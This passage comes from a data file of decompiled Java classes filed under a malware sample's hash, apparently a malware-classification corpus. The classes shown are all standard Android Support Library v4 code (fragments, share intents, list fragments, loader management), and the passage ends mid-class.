"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentTag.code","static class FragmentTag {   public static final int[] Fragment={R.attr.name,R.attr.id,R.attr.tag};   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   FragmentTag(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\FragmentTransaction.code","public abstract class FragmentTransaction {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1;   public abstract FragmentTransaction add(  int i,  Fragment fragment);   public abstract FragmentTransaction add(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction add(  Fragment fragment,  String str);   public abstract FragmentTransaction addToBackStack(  String str);   public abstract FragmentTransaction attach(  Fragment fragment);   public abstract int commit();   public abstract int commitAllowingStateLoss();   public abstract FragmentTransaction detach(  Fragment fragment);   public abstract FragmentTransaction disallowAddToBackStack();   public abstract FragmentTransaction hide(  Fragment fragment);   public abstract boolean isAddToBackStackAllowed();   public abstract boolean isEmpty();   public abstract FragmentTransaction remove(  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction setBreadCrumbShortTitle(  int i);   public abstract FragmentTransaction setBreadCrumbShortTitle(  CharSequence charSequence);   public abstract FragmentTransaction setBreadCrumbTitle(  int i);   public abstract FragmentTransaction setBreadCrumbTitle(  CharSequence charSequence);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2,  int i3,  int i4);   public abstract FragmentTransaction setTransition(  int i);   public abstract FragmentTransaction setTransitionStyle(  int i);   public abstract FragmentTransaction show(  Fragment fragment); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\InboxStyle.code","public static class InboxStyle extends Style {   ArrayList<CharSequence> mTexts=new ArrayList<>();   public InboxStyle(){   }   public InboxStyle(  Builder builder){     setBuilder(builder);   }   public InboxStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public InboxStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public InboxStyle addLine(  CharSequence cs){     this.mTexts.add(cs);     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\InstantiationException.code","public static class InstantiationException extends RuntimeException {   public InstantiationException(  String msg,  Exception cause){     super(msg,cause);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\IntentBuilder.code","public static class IntentBuilder {   private Activity mActivity;   private ArrayList<String> mBccAddresses;   private ArrayList<String> mCcAddresses;   private CharSequence mChooserTitle;   private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");   private ArrayList<Uri> mStreams;   private ArrayList<String> mToAddresses;   public static IntentBuilder from(  Activity launchingActivity){     return new IntentBuilder(launchingActivity);   }   private IntentBuilder(  Activity launchingActivity){     this.mActivity=launchingActivity;     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());     this.mIntent.addFlags(524288);   }   public Intent getIntent(){     if (this.mToAddresses != null) {       combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);       this.mToAddresses=null;     }     if (this.mCcAddresses != null) {       combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);       this.mCcAddresses=null;     }     if (this.mBccAddresses != null) {       combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);       this.mBccAddresses=null;     }     boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;     boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     if (!needsSendMultiple && isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }       this.mStreams=null;     }     if (needsSendMultiple && !isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }     }     return this.mIntent;   }   Activity getActivity(){     return this.mActivity;   }   private void combineArrayExtra(  String extra,  ArrayList<String> add){     String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);     int currentLength=currentAddresses != null ? currentAddresses.length : 0;     String[] finalAddresses=new String[add.size() + currentLength];     add.toArray(finalAddresses);     if (currentAddresses != null) {       System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);     }     this.mIntent.putExtra(extra,finalAddresses);   }   private void combineArrayExtra(  String extra,  String[] add){     Intent intent=getIntent();     String[] old=intent.getStringArrayExtra(extra);     int oldLength=old != null ? old.length : 0;     String[] result=new String[add.length + oldLength];     if (old != null) {       System.arraycopy(old,0,result,0,oldLength);     }     System.arraycopy(add,0,result,oldLength,add.length);     intent.putExtra(extra,result);   }   public Intent createChooserIntent(){     return Intent.createChooser(getIntent(),this.mChooserTitle);   }   public void startChooser(){     this.mActivity.startActivity(createChooserIntent());   }   public IntentBuilder setChooserTitle(  CharSequence title){     this.mChooserTitle=title;     return this;   }   public IntentBuilder setChooserTitle(  int resId){     return setChooserTitle(this.mActivity.getText(resId));   }   public IntentBuilder setType(  String mimeType){     this.mIntent.setType(mimeType);     return this;   }   public IntentBuilder setText(  CharSequence text){     this.mIntent.putExtra(""android.intent.extra.TEXT"",text);     return this;   }   public IntentBuilder setHtmlText(  String htmlText){     this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);     if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {       setText(Html.fromHtml(htmlText));     }     return this;   }   public IntentBuilder setStream(  Uri streamUri){     if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {       this.mIntent.setAction(""android.intent.action.SEND"");     }     this.mStreams=null;     this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);     return this;   }   public IntentBuilder addStream(  Uri streamUri){     Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     if (currentStream == null) {       return setStream(streamUri);     }     if (this.mStreams == null) {       this.mStreams=new ArrayList<>();     }     if (currentStream != null) {       this.mIntent.removeExtra(""android.intent.extra.STREAM"");       this.mStreams.add(currentStream);     }     this.mStreams.add(streamUri);     return this;   }   public IntentBuilder setEmailTo(  String[] addresses){     if (this.mToAddresses != null) {       this.mToAddresses=null;     }     this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder addEmailTo(  String address){     if (this.mToAddresses == null) {       this.mToAddresses=new ArrayList<>();     }     this.mToAddresses.add(address);     return this;   }   public IntentBuilder addEmailTo(  String[] addresses){     combineArrayExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder setEmailCc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder addEmailCc(  String address){     if (this.mCcAddresses == null) {       this.mCcAddresses=new ArrayList<>();     }     this.mCcAddresses.add(address);     return this;   }   public IntentBuilder addEmailCc(  String[] addresses){     combineArrayExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder setEmailBcc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder addEmailBcc(  String address){     if (this.mBccAddresses == null) {       this.mBccAddresses=new ArrayList<>();     }     this.mBccAddresses.add(address);     return this;   }   public IntentBuilder addEmailBcc(  String[] addresses){     combineArrayExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder setSubject(  String subject){     this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\IntentReader.code","public static class IntentReader {   private static final String TAG=""IntentReader"";   private Activity mActivity;   private ComponentName mCallingActivity;   private String mCallingPackage;   private Intent mIntent;   private ArrayList<Uri> mStreams;   public static IntentReader from(  Activity activity){     return new IntentReader(activity);   }   private IntentReader(  Activity activity){     this.mActivity=activity;     this.mIntent=activity.getIntent();     this.mCallingPackage=ShareCompat.getCallingPackage(activity);     this.mCallingActivity=ShareCompat.getCallingActivity(activity);   }   public boolean isShareIntent(){     String action=this.mIntent.getAction();     return action.equals(""android.intent.action.SEND"") || action.equals(""android.intent.action.SEND_MULTIPLE"");   }   public boolean isSingleShare(){     return this.mIntent.getAction().equals(""android.intent.action.SEND"");   }   public boolean isMultipleShare(){     return this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");   }   public String getType(){     return this.mIntent.getType();   }   public CharSequence getText(){     return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");   }   public String getHtmlText(){     String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);     if (this.mIntent == null) {       CharSequence text=getText();       if (text instanceof Spanned) {         return Html.toHtml((Spanned)text);       }       if (text != null) {         return ShareCompat.IMPL.escapeHtml(text);       }       return result;     }     return result;   }   public Uri getStream(){     return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");   }   public Uri getStream(  int index){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.get(index);     }     if (index == 0) {       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);   }   public int getStreamCount(){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.size();     }     return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;   }   public String[] getEmailTo(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");   }   public String[] getEmailCc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");   }   public String[] getEmailBcc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");   }   public String getSubject(){     return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");   }   public String getCallingPackage(){     return this.mCallingPackage;   }   public ComponentName getCallingActivity(){     return this.mCallingActivity;   }   public Drawable getCallingActivityIcon(){     if (this.mCallingActivity == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getActivityIcon(this.mCallingActivity);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling activity"",e);       return null;     }   }   public Drawable getCallingApplicationIcon(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationIcon(this.mCallingPackage);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling application"",e);       return null;     }   }   public CharSequence getCallingApplicationLabel(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve label for calling application"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ListFragment.code","public class ListFragment extends Fragment {   static final int INTERNAL_EMPTY_ID=16711681;   static final int INTERNAL_LIST_CONTAINER_ID=16711683;   static final int INTERNAL_PROGRESS_CONTAINER_ID=16711682;   ListAdapter mAdapter;   CharSequence mEmptyText;   View mEmptyView;   ListView mList;   View mListContainer;   boolean mListShown;   View mProgressContainer;   TextView mStandardEmptyView;   private final Handler mHandler=new Handler();   private final Runnable mRequestFocus=new Runnable(){     @Override public void run(){       ListFragment.this.mList.focusableViewAvailable(ListFragment.this.mList);     }   } ;   private final AdapterView.OnItemClickListener mOnClickListener=new AdapterView.OnItemClickListener(){     @Override public void onItemClick(    AdapterView<?> parent,    View v,    int position,    long id){       ListFragment.this.onListItemClick((ListView)parent,v,position,id);     }   } ;   @Override public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     Context context=getActivity();     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout pframe=new LinearLayout(context);     pframe.setId(INTERNAL_PROGRESS_CONTAINER_ID);     pframe.setOrientation(1);     pframe.setVisibility(8);     pframe.setGravity(17);     ProgressBar progress=new ProgressBar(context,null,R.attr.progressBarStyleLarge);     pframe.addView(progress,new FrameLayout.LayoutParams(-2,-2));     frameLayout.addView(pframe,new FrameLayout.LayoutParams(-1,-1));     FrameLayout lframe=new FrameLayout(context);     lframe.setId(INTERNAL_LIST_CONTAINER_ID);     TextView tv=new TextView(getActivity());     tv.setId(INTERNAL_EMPTY_ID);     tv.setGravity(17);     lframe.addView(tv,new FrameLayout.LayoutParams(-1,-1));     ListView lv=new ListView(getActivity());     lv.setId(R.id.list);     lv.setDrawSelectorOnTop(false);     lframe.addView(lv,new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(lframe,new FrameLayout.LayoutParams(-1,-1));     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     return frameLayout;   }   @Override public void onViewCreated(  View view,  Bundle savedInstanceState){     super.onViewCreated(view,savedInstanceState);     ensureList();   }   @Override public void onDestroyView(){     this.mHandler.removeCallbacks(this.mRequestFocus);     this.mList=null;     this.mListShown=false;     this.mListContainer=null;     this.mProgressContainer=null;     this.mEmptyView=null;     this.mStandardEmptyView=null;     super.onDestroyView();   }   public void onListItemClick(  ListView l,  View v,  int position,  long id){   }   public void setListAdapter(  ListAdapter adapter){     boolean hadAdapter=this.mAdapter != null;     this.mAdapter=adapter;     if (this.mList != null) {       this.mList.setAdapter(adapter);       if (!this.mListShown && !hadAdapter) {         setListShown(true,getView().getWindowToken() != null);       }     }   }   public void setSelection(  int position){     ensureList();     this.mList.setSelection(position);   }   public int getSelectedItemPosition(){     ensureList();     return this.mList.getSelectedItemPosition();   }   public long getSelectedItemId(){     ensureList();     return this.mList.getSelectedItemId();   }   public ListView getListView(){     ensureList();     return this.mList;   }   public void setEmptyText(  CharSequence text){     ensureList();     if (this.mStandardEmptyView == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     this.mStandardEmptyView.setText(text);     if (this.mEmptyText == null) {       this.mList.setEmptyView(this.mStandardEmptyView);     }     this.mEmptyText=text;   }   public void setListShown(  boolean shown){     setListShown(shown,true);   }   public void setListShownNoAnimation(  boolean shown){     setListShown(shown,false);   }   private void setListShown(  boolean shown,  boolean animate){     ensureList();     if (this.mProgressContainer == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     if (this.mListShown != shown) {       this.mListShown=shown;       if (shown) {         if (animate) {           this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));           this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         }  else {           this.mProgressContainer.clearAnimation();           this.mListContainer.clearAnimation();         }         this.mProgressContainer.setVisibility(8);         this.mListContainer.setVisibility(0);         return;       }       if (animate) {         this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));       }  else {         this.mProgressContainer.clearAnimation();         this.mListContainer.clearAnimation();       }       this.mProgressContainer.setVisibility(0);       this.mListContainer.setVisibility(8);     }   }   public ListAdapter getListAdapter(){     return this.mAdapter;   }   private void ensureList(){     if (this.mList == null) {       View root=getView();       if (root == null) {         throw new IllegalStateException(""Content view not yet created"");       }       if (root instanceof ListView) {         this.mList=(ListView)root;       }  else {         this.mStandardEmptyView=(TextView)root.findViewById(INTERNAL_EMPTY_ID);         if (this.mStandardEmptyView == null) {           this.mEmptyView=root.findViewById(R.id.empty);         }  else {           this.mStandardEmptyView.setVisibility(8);         }         this.mProgressContainer=root.findViewById(INTERNAL_PROGRESS_CONTAINER_ID);         this.mListContainer=root.findViewById(INTERNAL_LIST_CONTAINER_ID);         View rawListView=root.findViewById(R.id.list);         if (!(rawListView instanceof ListView)) {           if (rawListView == null) {             throw new RuntimeException(""Your content must have a ListView whose id attribute is 'android.R.id.list'"");           }           throw new RuntimeException(""Content has view with id attribute 'android.R.id.list' that is not a ListView class"");         }         this.mList=(ListView)rawListView;         if (this.mEmptyView != null) {           this.mList.setEmptyView(this.mEmptyView);         }  else         if (this.mEmptyText != null) {           this.mStandardEmptyView.setText(this.mEmptyText);           this.mList.setEmptyView(this.mStandardEmptyView);         }       }       this.mListShown=true;       this.mList.setOnItemClickListener(this.mOnClickListener);       if (this.mAdapter != null) {         ListAdapter adapter=this.mAdapter;         this.mAdapter=null;         setListAdapter(adapter);       }  else       if (this.mProgressContainer != null) {         setListShown(false,false);       }       this.mHandler.post(this.mRequestFocus);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\LoaderCallbacks.code","public interface LoaderCallbacks<D> {   Loader<D> onCreateLoader(  int i,  Bundle bundle);   void onLoadFinished(  Loader<D> loader,  D d);   void onLoaderReset(  Loader<D> loader); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\LoaderInfo.code","public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {   final Bundle mArgs;   LoaderManager.LoaderCallbacks<Object> mCallbacks;   Object mData;   boolean mDeliveredData;   boolean mDestroyed;   boolean mHaveData;   final int mId;   boolean mListenerRegistered;   Loader<Object> mLoader;   LoaderInfo mPendingLoader;   boolean mReportNextStart;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   public LoaderInfo(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callbacks){     this.mId=id;     this.mArgs=args;     this.mCallbacks=callbacks;   }   void start(){     if (this.mRetaining && this.mRetainingStarted) {       this.mStarted=true;       return;     }     if (!this.mStarted) {       this.mStarted=true;       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);       }       if (this.mLoader == null && this.mCallbacks != null) {         this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);       }       if (this.mLoader != null) {         if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);         }         if (!this.mListenerRegistered) {           this.mLoader.registerListener(this.mId,this);           this.mListenerRegistered=true;         }         this.mLoader.startLoading();       }     }   }   void retain(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);     }     this.mRetaining=true;     this.mRetainingStarted=this.mStarted;     this.mStarted=false;     this.mCallbacks=null;   }   void finishRetain(){     if (this.mRetaining) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);       }       this.mRetaining=false;       if (this.mStarted != this.mRetainingStarted && !this.mStarted) {         stop();       }     }     if (this.mStarted && this.mHaveData && !this.mReportNextStart) {       callOnLoadFinished(this.mLoader,this.mData);     }   }   void reportStart(){     if (this.mStarted && this.mReportNextStart) {       this.mReportNextStart=false;       if (this.mHaveData) {         callOnLoadFinished(this.mLoader,this.mData);       }     }   }   void stop(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);     }     this.mStarted=false;     if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {       this.mListenerRegistered=false;       this.mLoader.unregisterListener(this);       this.mLoader.stopLoading();     }   }   void destroy(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);     }     this.mDestroyed=true;     boolean needReset=this.mDeliveredData;     this.mDeliveredData=false;     if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);       }       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";       }       try {         this.mCallbacks.onLoaderReset(this.mLoader);       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }     this.mCallbacks=null;     this.mData=null;     this.mHaveData=false;     if (this.mLoader != null) {       if (this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);       }       this.mLoader.reset();     }     if (this.mPendingLoader != null) {       this.mPendingLoader.destroy();     }   }   @Override public void onLoadComplete(  Loader<Object> loader,  Object data){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);     }     if (this.mDestroyed) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");         return;       }       return;     }     if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");         return;       }       return;     }     LoaderInfo pending=this.mPendingLoader;     if (pending != null) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);       }       this.mPendingLoader=null;       LoaderManagerImpl.this.mLoaders.put(this.mId,null);       destroy();       LoaderManagerImpl.this.installLoader(pending);       return;     }     if (this.mData != data || !this.mHaveData) {       this.mData=data;       this.mHaveData=true;       if (this.mStarted) {         callOnLoadFinished(loader,data);       }     }     LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);     if (info != null && info != this) {       info.mDeliveredData=false;       info.destroy();       LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);     }     if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {       LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();     }   }   void callOnLoadFinished(  Loader<Object> loader,  Object data){     if (this.mCallbacks != null) {       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";       }       try {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));         }         this.mCallbacks.onLoadFinished(loader,data);         this.mDeliveredData=true;       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.mId);     sb.append("" : "");     DebugUtils.buildShortClassTag(this.mLoader,sb);     sb.append(""}}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mArgs="");     writer.println(this.mArgs);     writer.print(prefix);     writer.print(""mCallbacks="");     writer.println(this.mCallbacks);     writer.print(prefix);     writer.print(""mLoader="");     writer.println(this.mLoader);     if (this.mLoader != null) {       this.mLoader.dump(prefix + ""  "",fd,writer,args);     }     if (this.mHaveData || this.mDeliveredData) {       writer.print(prefix);       writer.print(""mHaveData="");       writer.print(this.mHaveData);       writer.print(""  mDeliveredData="");       writer.println(this.mDeliveredData);       writer.print(prefix);       writer.print(""mData="");       writer.println(this.mData);     }     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mReportNextStart="");     writer.print(this.mReportNextStart);     writer.print("" mDestroyed="");     writer.println(this.mDestroyed);     writer.print(prefix);     writer.print(""mRetaining="");     writer.print(this.mRetaining);     writer.print("" mRetainingStarted="");     writer.print(this.mRetainingStarted);     writer.print("" mListenerRegistered="");     writer.println(this.mListenerRegistered);     if (this.mPendingLoader != null) {       writer.print(prefix);       writer.println(""Pending Loader "");       writer.print(this.mPendingLoader);       writer.println("":"");       this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\LoaderManager.code","public abstract class LoaderManager { public interface LoaderCallbacks<D> {     Loader<D> onCreateLoader(    int i,    Bundle bundle);     void onLoadFinished(    Loader<D> loader,    D d);     void onLoaderReset(    Loader<D> loader);   }   public abstract void destroyLoader(  int i);   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract <D>Loader<D> getLoader(  int i);   public abstract <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public abstract <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public static void enableDebugLogging(  boolean enabled){     LoaderManagerImpl.DEBUG=enabled;   }   public boolean hasRunningLoaders(){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\LoaderManagerImpl.code","public class LoaderManagerImpl extends LoaderManager {   static boolean DEBUG=false;   static final String TAG=""LoaderManager"";   FragmentActivity mActivity;   boolean mCreatingLoader;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   final String mWho;   final SparseArrayCompat<LoaderInfo> mLoaders=new SparseArrayCompat<>();   final SparseArrayCompat<LoaderInfo> mInactiveLoaders=new SparseArrayCompat<>(); public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {     final Bundle mArgs;     LoaderManager.LoaderCallbacks<Object> mCallbacks;     Object mData;     boolean mDeliveredData;     boolean mDestroyed;     boolean mHaveData;     final int mId;     boolean mListenerRegistered;     Loader<Object> mLoader;     LoaderInfo mPendingLoader;     boolean mReportNextStart;     boolean mRetaining;     boolean mRetainingStarted;     boolean mStarted;     public LoaderInfo(    int id,    Bundle args,    LoaderManager.LoaderCallbacks<Object> callbacks){       this.mId=id;       this.mArgs=args;       this.mCallbacks=callbacks;     }     void start(){       if (this.mRetaining && this.mRetainingStarted) {         this.mStarted=true;         return;       }       if (!this.mStarted) {         this.mStarted=true;         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);         }         if (this.mLoader == null && this.mCallbacks != null) {           this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);         }         if (this.mLoader != null) {           if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);           }           if (!this.mListenerRegistered) {             this.mLoader.registerListener(this.mId,this);             this.mListenerRegistered=true;           }           this.mLoader.startLoading();         }       }     }     void retain(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);       }       this.mRetaining=true;       this.mRetainingStarted=this.mStarted;       this.mStarted=false;       this.mCallbacks=null;     }     void finishRetain(){       if (this.mRetaining) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);         }         this.mRetaining=false;         if (this.mStarted != this.mRetainingStarted && !this.mStarted) {           stop();         }       }       if (this.mStarted && this.mHaveData && !this.mReportNextStart) {         callOnLoadFinished(this.mLoader,this.mData);       }     }     void reportStart(){       if (this.mStarted && this.mReportNextStart) {         this.mReportNextStart=false;         if (this.mHaveData) {           callOnLoadFinished(this.mLoader,this.mData);         }       }     }     void stop(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);       }       this.mStarted=false;       if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);         this.mLoader.stopLoading();       }     }     void destroy(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);       }       this.mDestroyed=true;       boolean needReset=this.mDeliveredData;       this.mDeliveredData=false;       if (this.mCallbacks != null && this.mLoader != null && 